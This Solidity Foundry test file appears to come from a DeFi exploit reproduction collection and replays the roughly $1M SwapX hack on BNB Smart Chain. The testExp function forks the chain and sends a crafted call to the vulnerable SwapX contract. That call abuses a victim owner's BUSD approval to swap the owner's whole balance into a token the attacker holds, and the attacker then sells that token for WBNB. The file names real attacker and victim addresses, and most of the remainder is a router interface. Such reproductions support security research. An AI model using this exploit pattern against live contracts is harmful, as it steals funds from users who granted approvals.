// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IWBNB.sol";
import "./interface/IERC20.sol";
import "./interface/IPancakeRouter02.sol";

// Total Lost: total 1M US$
// Chain: BSC
// Attacker: 0x2c1F05E120710De792061031cfb05847cE53fC56
// Attack Contract: 0x93f8b4D76A0274cC1Bd03A44AEEfdeD14Ca21791
// Attack Tx: 0xc8138238b8c05834e102a1a936aa27737b5bbef6d20871b9ae3f34ceb21b72ac
// Vulnerable Contract: 0x6d8981847eb3cc2234179d0f0e72f6b6b2421a01

contract SwapXExp is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter02 constant PancakeRouterv2 = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);

    address SWAPX = address(0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01);
    IBiswapRouter02 BiswapRouter02 = IBiswapRouter02(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
    IERC20 DND = IERC20(0x34EA3F7162E6f6Ed16bD171267eC180fD5c848da);

    address owner = address(0xC0019Bb87c5b6DA621Ea4567234938E1dB36862f);

    function setUp() public {
        cheat.createSelectFork("bsc", 26025663);
    }

    function testExp() public {
        DND.approve(address(BiswapRouter02), type(uint256).max);

        console2.log("Before attack, The balance of this(DND): ", DND.balanceOf(address(this)));
        console2.log("Before attack, The balance of this(WBNB): ", wbnb.balanceOf(address(this)));
        console2.log("Before attack, The balance of owner(BUSD): ", busd.balanceOf(owner));
        console2.log("Before attack, The allowance of owner(BUSD) to SWAPX:", busd.allowance(owner, SWAPX));

        console2.log("Swap WBNB to DND... ");

        address[] memory Path_pancake1 = new address[](2);
        Path_pancake1[0] = address(wbnb);
        Path_pancake1[1] = address(DND);
        PancakeRouterv2.swapExactETHForTokens{value: 9 * 1e17}(2, Path_pancake1, address(this), block.timestamp);

        console2.log("After swap, The balance of this(DND): ", DND.balanceOf(address(this)));
        console2.log("After swap, The balance of this(WBNB): ", wbnb.balanceOf(address(this)));

        uint256 balance = busd.balanceOf(owner);

        console2.log("Attack... ");

        address[] memory Path_swapx = new address[](3);
        Path_swapx[0] = address(busd);
        Path_swapx[1] = address(wbnb);
        Path_swapx[2] = address(DND);
        uint256[] memory array = new uint256[](16);
        array[0] = 2 ** 16;
        array[11] = 2 ** 8 + 1;
        bytes memory data = abi.encodeWithSelector(bytes4(0x4f1f05bc), Path_swapx, balance, 0, array, owner);
        // console2.logBytes(data);
        (bool success,) = SWAPX.call(data);

        require(success);
        console2.log("Success. ");

        console2.log("Swap DND to WBNB... ");
        address[] memory Path_pancake2 = new address[](2);
        Path_pancake2[0] = address(DND);
        Path_pancake2[1] = address(wbnb);
        BiswapRouter02.swapExactTokensForTokens(
            DND.balanceOf(address(this)), 1, Path_pancake2, address(this), block.timestamp
        );

        console2.log("After swap, The balance of attacker(WBNB): ", wbnb.balanceOf(address(this)));
    }
}

interface IBiswapRouter02 {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function WETH() external view returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external view returns (address);

    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut, uint256 swapFee)
        external
        pure
        returns (uint256 amountIn);

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut, uint256 swapFee)
        external
        pure
        returns (uint256 amountOut);

    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);

    function isOwner(address account) external view returns (bool);

    function owner() external view returns (address);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function renounceOwnership() external;

    function setSwapFeeReward(address _swapFeeReward) external;

    function swapETHForExactTokens(uint256 amountOut, address[] memory path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    function swapExactETHForTokens(uint256 amountOutMin, address[] memory path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function swapFeeReward() external view returns (address);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function transferOwnership(address newOwner) external;
}
